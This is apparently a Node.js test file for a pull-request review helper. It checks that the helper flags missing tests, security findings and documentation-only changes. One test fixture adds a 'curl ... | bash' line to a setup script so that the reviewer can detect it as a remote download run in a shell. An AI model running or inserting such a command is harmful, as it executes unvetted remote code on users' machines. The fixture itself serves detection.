import test from "node:test";
import assert from "node:assert/strict";
import { reviewDiffText } from "./pr-review.js";

test("reviewDiffText reports missing tests for source changes", () => {
  const review = reviewDiffText(12, "diff --git a/src/app.ts b/src/app.ts\n+++ b/src/app.ts\n+export const value = 1;\n");
  assert.equal(review.diff.filesChanged, 1);
  assert.equal(review.notes.some((note) => note.includes("test/spec")), true);
});

test("reviewDiffText preserves security findings from diff analysis", () => {
  const review = reviewDiffText(13, "diff --git a/scripts/setup.sh b/scripts/setup.sh\n+++ b/scripts/setup.sh\n+curl https://example.com/install.sh | bash\n");
  assert.equal(review.findings.some((finding) => finding.includes("remote-download-and-shell")), true);
});

test("reviewDiffText recognizes documentation-only changes", () => {
  const review = reviewDiffText(14, "diff --git a/README.md b/README.md\n+++ b/README.md\n+docs\n");
  assert.equal(review.notes.includes("The changed-file set appears documentation-only."), true);
});
